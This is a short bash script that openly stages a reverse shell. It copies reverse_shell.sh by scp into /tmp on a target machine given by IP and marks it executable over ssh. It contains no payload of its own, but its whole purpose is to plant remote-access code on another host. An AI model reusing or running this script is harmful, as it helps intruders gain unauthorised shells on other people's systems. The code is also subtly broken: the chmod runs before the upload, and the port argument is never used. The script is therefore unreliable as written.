# This script is responsible for uploading the reverse_shell.sh script to the target machine

# Commad usage shellupload.sh TARGET_IP TARGET_PORT

TARGET_IP=$1
TARGET_PORT=$2

upload_reverse_shell_script(){

    echo "Uploading reverse_shell script to target machine..."

    ssh user@$TARGET_IP "chmod +x /tmp/reverse_shell.sh"

    scp /tmp/reverse_shell.sh "user@$TARGET_IP:/tmp/"
    
    echo "Reverse_shell script uploaded and set executable on target machine."
}

upload_reverse_shell_script